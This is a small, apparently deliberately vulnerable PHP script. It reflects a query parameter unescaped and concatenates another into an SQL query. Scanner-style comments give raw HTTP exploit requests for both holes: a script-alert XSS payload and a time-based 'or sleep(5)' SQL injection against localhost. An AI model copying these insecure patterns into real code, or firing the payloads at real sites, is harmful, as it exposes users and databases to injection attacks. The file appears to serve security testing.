<?php
$id = $_GET['id'];
$user_id = $_GET['user_id'];
if(isset($id) && isset($user_id))
{
    //TODO: AI XSS issue #209, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/209, 89c08f48
    //AI exploit:
    //GET /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-4dbbcbd/vulnerable.php?user_id=1&id=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
    //Host: localhost
    //Accept-Encoding: identity
    //Connection: close
    echo "Dialog: $id";
    //TODO: AI SQL issue #210, High, SQL Injection, https://github.com/userwithrepo/ACSI_S4/issues/210, 41a79386
    //AI exploit:
    //GET /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-4dbbcbd/vulnerable.php?user_id=%27+or+sleep%285%29+%3D+%271&id=1 HTTP/1.1
    //Host: localhost
    //Accept-Encoding: identity
    //Connection: close
    $res = mysql_query("SELECT msg FROM dialogs WHERE user_id='$user_id'") or dir(mysql_error());
    $res = mysql_fetch_assoc($res);
    //TODO: AI XSS issue #209, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/209, 7a25c661
    //AI exploit:
    //GET /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-4dbbcbd/vulnerable.php?user_id=1&id=1 HTTP/1.1
    //Host: localhost
    //Accept-Encoding: identity
    //Connection: close
    echo $res['msg'];
}
?>
